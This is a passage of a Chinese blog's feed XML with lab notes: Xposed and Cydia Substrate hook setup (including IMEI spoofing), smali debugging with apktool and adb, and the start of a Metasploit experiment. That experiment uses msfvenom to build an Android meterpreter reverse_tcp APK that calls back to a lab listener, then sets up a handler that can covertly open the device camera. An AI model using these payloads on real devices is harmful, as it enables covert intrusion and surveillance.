class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by fanqiliang on 2018/12/25.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookTest</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">// "com.wanbang.xposedemo"为自己代码的包名</span></span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">"com.wanbang.xposedemo"</span>)) &#123;</span><br><span class="line">            XposedBridge.log(<span class="string">" has Hooked!"</span>);</span><br><span class="line">            <span class="comment">// "com.wanbang.xposedemo.MainActivity"为自己代码的类名</span></span><br><span class="line">            Class clazz = lpparam.classLoader.loadClass(<span class="string">"com.wanbang.xposedemo.MainActivity"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// "toastMessage"为需要Hook的方法名</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(clazz, <span class="string">"toastMessage"</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">"BBBB has Hooked!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    param.setResult(<span class="string">"你已被劫持"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.3.4 添加入口点</strong></p><ol><li>新建assets 文件夹</li></ol><p>右键点击 “main ” 文件夹 ， 选择new –&gt; Folder –&gt;Assets Folder，输入文件夹名为assets，如下图所示：</p><p><img src="newassets.PNG" alt=""></p><p>新建后结构如下图：</p><p><img src="assets1.PNG" alt=""></p><ol><li>新建xposed_init文件,在assets文件夹下新建xposed_init文件，如下入所示</li></ol><p><img src="xposed_init1.PNG" alt=""></p><p><img src="xposed_init2.PNG" alt=""></p><ol><li>配置xposed_init</li></ol><p>在xposed_init文件中输入hook代码的类名，类名需要写全路径（即包名+类名）。如下图是我编写的HookTest类，全路径为com..wanbang.xposedome.HookTest,</p><p><img src="xposed_init3.PNG" alt=""></p><p>因此在xposed_init写入如下全路径</p><p><img src="xposed_init4.PNG" alt=""></p><p><strong>2.3.5 禁用 Instant Run</strong></p><p>单击File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run，把勾全部去掉(该路径为Mac系统的路径，其他系统可查找相应路径)，具体如下图所示：</p><p><img src="5.PNG" alt=""></p><p><strong>注意：每次修改代码都需重启Xposed</strong></p><h2 id="Cydia-Hook-配置"><a href="#Cydia-Hook-配置" class="headerlink" title="Cydia Hook 配置"></a><strong>Cydia Hook</strong> 配置</h2><h3 id="一、环境准备-1"><a href="#一、环境准备-1" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1-1-模拟器-1"><a href="#1-1-模拟器-1" class="headerlink" title="1.1 模拟器"></a>1.1 模拟器</h4><p>经测试Substrate的apk包在很多模拟器中都无法正常运行，此处使用Genymotion的Google Nexys4 机型。</p><h4 id="1-2-相关包下载"><a href="#1-2-相关包下载" class="headerlink" title="1.2 相关包下载"></a>1.2 相关包下载</h4><p>apk包：<a href="http://www.cydiasubstrate.com/" target="_blank" rel="noopener">http://www.cydiasubstrate.com/</a></p><p>sdk下载：<a href="http://asdk.cydiasubstrate.com/zips/cydia_substrate-r2.zip" target="_blank" rel="noopener">http://asdk.cydiasubstrate.com/zips/cydia_substrate-r2.zip</a></p><p>apk包下载后，安装至模拟器中，授予root权限。打开应用，如图：</p><p><img src="https://uploader.shimo.im/f/wl8UR9POi3ELsZmK.png!thumbnail" alt="img"></p><h3 id="二、模块编写-1"><a href="#二、模块编写-1" class="headerlink" title="二、模块编写"></a>二、模块编写</h3><h4 id="2-1-java层hook"><a href="#2-1-java层hook" class="headerlink" title="2.1 java层hook"></a>2.1 java层hook</h4><p><strong>2.1.1 配置AndroidManifest.xml</strong></p><p>（1）增加权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name&#x3D;&quot;cydia.permission.SUBSTRATE&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>（2）Application标签中增加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data android:name&#x3D;&quot;com.saurik.substrate.main&quot; android:value&#x3D;&quot;.Main&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>注：此处.Main文件是模块的入口文件，完成路径为：’packageName’.Main</p><p><img src="https://uploader.shimo.im/f/zbZwcjmeH3AtFLnl.png!thumbnail" alt="img"></p><p><strong>2.1.2 导入jar包</strong></p><p>将下载的sdk包解压缩，取出substrate-api.jar，放在libs目录下，并Add As Library</p><p><strong>2.1.3 编写hook代码</strong></p><p>在Main类中添加方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static void initialize() &#123; &#x2F;&#x2F; ... code to run when extension is loaded &#125;</span><br></pre></td></tr></table></figure><p>具体的hook代码可以写在这个方法中。</p><p>如，hook TelePhonyManager中的getDeviceId()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        MS.hookClassLoad(<span class="string">"android.telephony.TelephonyManager"</span>,</span><br><span class="line">                <span class="keyword">new</span> MS.ClassLoadHook() &#123;</span><br><span class="line">                    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">classLoaded</span><span class="params">(Class&lt;?&gt; arg0)</span> </span>&#123;</span><br><span class="line">                        Method hookimei;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            hookimei = arg0.getMethod(<span class="string">"getDeviceId"</span>, <span class="keyword">null</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            hookimei = <span class="keyword">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (hookimei != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">final</span> MS.MethodPointer old1 = <span class="keyword">new</span> MS.MethodPointer();</span><br><span class="line">                            MS.hookMethod(arg0, hookimei, <span class="keyword">new</span> MS.MethodHook() &#123;</span><br><span class="line">                                <span class="meta">@Override</span></span><br><span class="line">                                <span class="function"><span class="keyword">public</span> Object <span class="title">invoked</span><span class="params">(Object arg0,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      Object... arg1)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                                    String imei = (String) old1.invoke(arg0,</span><br><span class="line">                                            arg1);</span><br><span class="line">                                            <span class="comment">//此处可对imei进行修改</span></span><br><span class="line">                                    <span class="keyword">return</span> imei;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, old1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-Native层hook"><a href="#2-2-Native层hook" class="headerlink" title="2.2 Native层hook"></a>2.2 Native层hook</h4><p><strong>2.2.1 相关文件导入和新建</strong></p><p>（1）在src/main目录下新建目录jni</p><p><img src="https://uploader.shimo.im/f/Rud1Vpx39MgBuxQN.png!thumbnail" alt="img"></p><p>（2）向目录中添加Cydia sdk包中的.h头文件和两个.so库；（由于测试环境为模拟器，因此仅放了x86类型的so文件）</p><p>（3） 在jni目录下新建.cpp文件，</p><p>本例中为module.cpp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"substrate.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//配置，这里是hook可运行程序（即NDK小程序）的写法，下面那个就是hook dvm的写法</span></span><br><span class="line">MSConfig(MSFilterExecutable,<span class="string">"/system/bin/app_process"</span>)</span><br><span class="line"><span class="comment">//MSConfig(MSFilterLibrary, "libdvm.so");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//旧的函数地址，目的为了保留指向原来函数的入口，在新的函数执行</span></span><br><span class="line"><span class="comment">//完后，一般会再调用该函数，以确保程序的正常运行</span></span><br><span class="line"><span class="keyword">char</span>* (* stringFromJNI)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//新的函数，替代hook的函数，返回修改后的值</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">newHello</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//直接返回新的字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"cydia hook native success!"</span>;</span><br><span class="line">    <span class="comment">//执行原函数，确保程序运行正常，但这里代码简单，可以直接返回字符串即可</span></span><br><span class="line">    <span class="comment">//return hello();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过so库的绝对路径和函数名，找到其函数的映射地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">lookup_symbol</span><span class="params">(<span class="keyword">char</span>* libraryname,<span class="keyword">char</span>* symbolname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取so库的句柄</span></span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(libraryname, RTLD_GLOBAL | RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span> (handle != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//根据so库句柄和符号名（即函数名）获取函数地址</span></span><br><span class="line">        <span class="keyword">void</span> * symbol = dlsym(handle, symbolname);</span><br><span class="line">        <span class="keyword">if</span> (symbol != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> symbol;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MSInitialize</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取hook函数的地址,最好不要用下面MS提供的方法</span></span><br><span class="line">    <span class="keyword">void</span> * symbol = lookup_symbol(<span class="string">"/data/data/com.example.cydiatestdemo/lib/cydiatest-jni.so"</span>,<span class="string">"stringFromJNI"</span>);</span><br><span class="line"><span class="comment">//    MSImageRef  image=MSGetImageByName("/data/data/com.samuelzhan.hello/lib/libhello.so");</span></span><br><span class="line"><span class="comment">//    void *symbol=MSFindSymbol(image, "createHello");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里将旧函数的入口（参数一）指向hello(参数三），然后执行新函数（参数二）</span></span><br><span class="line">    MSHookFunction(symbol, (<span class="keyword">void</span>*)&amp;newHello, (<span class="keyword">void</span>**)&amp;stringFromJNI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（4）生成Android.mk：Build -&gt; Make Project ，会报错，但不用管 。进入：app/build/intermediates/ndk/debug目录，取出Android.mk，放在src/main/jni目录下。</p><p><strong>2.2.2 相关配置</strong></p><p>（1）build.gradle</p><p><img src="https://uploader.shimo.im/f/KFRnUuSSgbkLsfsJ.png!thumbnail" alt="img"></p><p>defaultConfig内：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;</span><br><span class="line">        cppFlags &quot;&quot;</span><br><span class="line">        &#x2F;&#x2F;生成多个版本的so文件</span><br><span class="line">        abiFilters &#39;x86&#39;,&#39;x86_64&#39;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>android内：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;</span><br><span class="line">        path &quot;CMakeLists.txt&quot;  &#x2F;&#x2F; 设置所要编写的c源码位置，以及编译后so文件的名字</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）拷入CMakeLists.txt，放在与build.gradle同级目录下（即app目录下）</p><p>注意：生成的module必须以.cy为后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># For more information about using CMake with Android Studio, read the</span><br><span class="line"># documentation: https:&#x2F;&#x2F;d.android.com&#x2F;studio&#x2F;projects&#x2F;add-native-code.html</span><br><span class="line"></span><br><span class="line"># Sets the minimum version of CMake required to build the native library.</span><br><span class="line">#CMakeLists.txt</span><br><span class="line">cmake_minimum_required(VERSION 3.4.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set(lib_src_DIR $&#123;CMAKE_SOURCE_DIR&#125;&#x2F;src&#x2F;main&#x2F;jni)</span><br><span class="line">include_directories(</span><br><span class="line">        $&#123;CMAKE_SOURCE_DIR&#125;&#x2F;src&#x2F;main&#x2F;jni</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Creates and names a library, sets it as either STATIC</span><br><span class="line"># or SHARED, and provides the relative paths to its source code.</span><br><span class="line"># You can define multiple libraries, and CMake builds them for you.</span><br><span class="line"># Gradle automatically packages shared libraries with your APK.</span><br><span class="line"></span><br><span class="line">add_library( # Sets the name of the library.</span><br><span class="line">      # 设置so文件名称.</span><br><span class="line">       module.cy</span><br><span class="line"></span><br><span class="line">       # Sets the library as a shared library.</span><br><span class="line">       SHARED</span><br><span class="line">       # 设置这个so文件为共享.</span><br><span class="line"></span><br><span class="line">       # Provides a relative path to your source file(s).</span><br><span class="line">       # 设置这个so文件为共享.</span><br><span class="line">       src&#x2F;main&#x2F;jni&#x2F;module.cpp)</span><br><span class="line"></span><br><span class="line"># Searches for a specified prebuilt library and stores the path as a</span><br><span class="line"># variable. Because CMake includes system libraries in the search path by</span><br><span class="line"># default, you only need to specify the name of the public NDK library</span><br><span class="line"># you want to add. CMake verifies that the library exists before</span><br><span class="line"># completing its build.</span><br><span class="line"></span><br><span class="line">find_library( # Sets the name of the path variable.</span><br><span class="line">       log-lib</span><br><span class="line"></span><br><span class="line">       # Specifies the name of the NDK library that</span><br><span class="line">       # you want CMake to locate.</span><br><span class="line">       log )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_library(</span><br><span class="line">        substrate</span><br><span class="line">        SHARED</span><br><span class="line">        IMPORTED</span><br><span class="line">)</span><br><span class="line">set_target_properties(</span><br><span class="line">        substrate</span><br><span class="line">        PROPERTIES IMPORTED_LOCATION</span><br><span class="line">        $&#123;lib_src_DIR&#125;&#x2F;libsubstrate.so</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add_library(</span><br><span class="line">        substrate-dvm</span><br><span class="line">        SHARED</span><br><span class="line">        IMPORTED</span><br><span class="line">)</span><br><span class="line">set_target_properties(</span><br><span class="line">        substrate-dvm</span><br><span class="line">        PROPERTIES IMPORTED_LOCATION</span><br><span class="line">        $&#123;lib_src_DIR&#125;&#x2F;libsubstrate-dvm.so</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Specifies libraries CMake should link to your target library. You</span><br><span class="line"># can link multiple libraries, such as libraries you define in this</span><br><span class="line"># build script, prebuilt third-party libraries, or system libraries.</span><br><span class="line"></span><br><span class="line">target_link_libraries( # Specifies the target library.</span><br><span class="line">            # 制定目标库.</span><br><span class="line">            module.cy</span><br><span class="line">            substrate</span><br><span class="line">            substrate-dvm</span><br><span class="line"></span><br><span class="line">            # Links the target library to the log library</span><br><span class="line">            # included in the NDK.</span><br><span class="line">            $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure><p>引入第三方的头文件，需要指定其路径：</p><p><img src="https://uploader.shimo.im/f/Dx3ZeJIsULINnQ3C.png!thumbnail" alt="img"></p><p>引入的第三方库，需要在CMakeLists中指定名字和路径：</p><p><img src="https://uploader.shimo.im/f/pFo4F8Y1T3UrwEhN.png!thumbnail" alt="img"></p><p>3）AndroidManifest.xml配置：</p><p>添加权限：</p><p><code>&lt;uses-permission android:name=&quot;cydia.permission.SUBSTRATE&quot; /&gt;</code></p><p>Application标签的属性：<code>android:hasCode=&quot;false&quot;</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Java层Hook工具，应用较多的有Xposed和Friday；so层Hook工具常用Substrate。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Frida：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;动态插桩工具，使用Python、JavaScript共同完成。主要hook逻辑在JavaS
      
    
    </summary>
    
    
      <category term="工具配置笔记" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="hook" scheme="http://yoursite.com/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>Android Studio调试apk备忘录-copy</title>
    <link href="http://yoursite.com/2020/03/26/AndroidStudio%E8%B0%83%E8%AF%95apk%E5%A4%87%E5%BF%98%E5%BD%95-copy/"/>
    <id>http://yoursite.com/2020/03/26/AndroidStudio%E8%B0%83%E8%AF%95apk%E5%A4%87%E5%BF%98%E5%BD%95-copy/</id>
    <published>2020-03-26T08:24:05.000Z</published>
    <updated>2020-03-26T08:33:32.077Z</updated>
    
    <content type="html"><![CDATA[<p>1.反编译apk: <code>apktool d apkname.apk</code></p><p>2.打开Android Studio，导入程序目录</p><p><img src="%E5%AF%BC%E5%85%A5.PNG" alt=""></p><p>选择该目录，然后，一路Next, 最后Finish。  </p><p><img src="import1.PNG" alt=""></p><p><img src="impoer2.PNG" alt=""></p><p><img src="import3.PNG" alt=""></p><p><img src="import4.PNG" alt=""></p><p>导入目录后，切换至Project模式，右键smali目录-&gt;Mark Derictory as -&gt; Sources Root，然后在需要的位置下断点。</p><p>4、 打开模拟器（这里用的MuMu），安装待调试应用。<strong>注意</strong>：若使用真机，需要先反编译apk文件，将应用的AndroidManifest.xml中的Application标签中加上android:debuggable=”true”，再重新回编译成apk包，并签名，然后安装至测试机，否则不能调试。</p><p>5、获取入口Activity:<br><code>adb shell dumpsys activity top | grep ACTIVITY</code><br>result示例：<br>com.k7game.app.black7.sdy/com.k7game.app.AppActivity</p><p>6、以debug状态打开此Activity<br><code>adb shell am start -D -n “Activity信息”</code><br>示例：<br>adb shell am start -D -n com.k7game.app.black7.sdy/com.k7game.app.AppActivity</p><p>7、获取应用pid<br><code>adb shell ps | grep &quot;包名&quot;</code><br>示例：<br>adb shell ps | grep com.k7game.app.black7.sdy<br>result示例:<br>u0_a35 3993 255 1558152 52500 futex_wait b7267fd2 S com.k7game.app.black7.sdy<br>则pid为： 3993</p><p>8、设置端口转发<br><code>adb forward tcp:8700 jdwp: “pid”</code><br>示例：<br>adb forward tcp:8700 jdwp:3993</p><p>9、点击Android Studio的调试图标，并选择待调试进程，即可进行后续调试。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.反编译apk: &lt;code&gt;apktool d apkname.apk&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.打开Android Studio，导入程序目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;%E5%AF%BC%E5%85%A5.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;选择该
      
    
    </summary>
    
    
      <category term="工具配置笔记" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>msf操作Android设备实验-copy</title>
    <link href="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/"/>
    <id>http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/</id>
    <published>2020-03-26T07:37:01.000Z</published>
    <updated>2020-03-26T07:56:20.260Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p><strong>写在前面的感想：</strong>做这个实验的时候，才发现一直以为的“手机不root就很安全”实在是太天真了。 有心人想窃取个人隐私简直轻而易举，需要了解攻击者的手法，不断提高防御水平，才能“知己知彼，百战不殆”。</p><p><strong>维护信息安全，人人有责。</strong></p><h2 id="一、生成payload程序"><a href="#一、生成payload程序" class="headerlink" title="一、生成payload程序"></a>一、生成payload程序</h2><p>kali ip为：<em>172.16.20.98</em>； Android设备ip为：<em>172.16.20.81</em>。打开kali终端，执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.20.98 lport&#x3D;4444 R &gt; &#x2F;opt&#x2F;apk.apk</span><br></pre></td></tr></table></figure><p>命令中的lhost是kali的ip，lport指定一个端口。</p><p><img src="apk.PNG" alt=""></p><p>将生成的apk文件安装至Android设备中备用。 安装成功后桌面会多一个名字为MainActivity的应用图标。</p><h2 id="二、连接Android设备"><a href="#二、连接Android设备" class="headerlink" title="二、连接Android设备"></a>二、连接Android设备</h2><p>执行以下步骤：</p><ol><li>在kali终端输入<code>msfconsole</code>，进入msf环境</li><li>启动监听模块：<code>use exploit/multi/handler</code></li><li>设置payload：<code>set payload android/meterpreter/reverse_tcp</code></li><li>设置LHOST: <code>set lhost 172.16.20.98</code></li><li>设置LPORT：<code>set lport 4444</code></li><li>最后执行：<code>exploit</code></li></ol><p><img src="%E6%8D%95%E8%8E%B7.PNG" alt=""></p><p>点击MainActivity图标（点击之后桌面没有反应，是正常的），可以在kali终端看到连接已经建立：</p><p><img src="%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5.PNG" alt=""></p><p><strong>功能：</strong>可以输入<code>help</code>命令查看有哪些操作，这里仅举一些例子，如查看设备信息、是否root、在设备上毫无异常的情况下打开摄像头等等</p><p><img src="%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E4%BF%A1%E6%81%AF.PNG" alt=""></p><p><img src="%E6%89%93%E5%BC%80%E6%91%84%E5%83%8F%E5%A4%B4.PNG" alt=""></p><p><img src="webcam.PNG" alt=""></p><p>但是，这个连接是在APP启动的时候建立的，稳定性比较差，一旦断网就会断开连接，且不会自动重连。</p><h2 id="二、稳定性增强版"><a href="#二、稳定性增强版" class="headerlink" 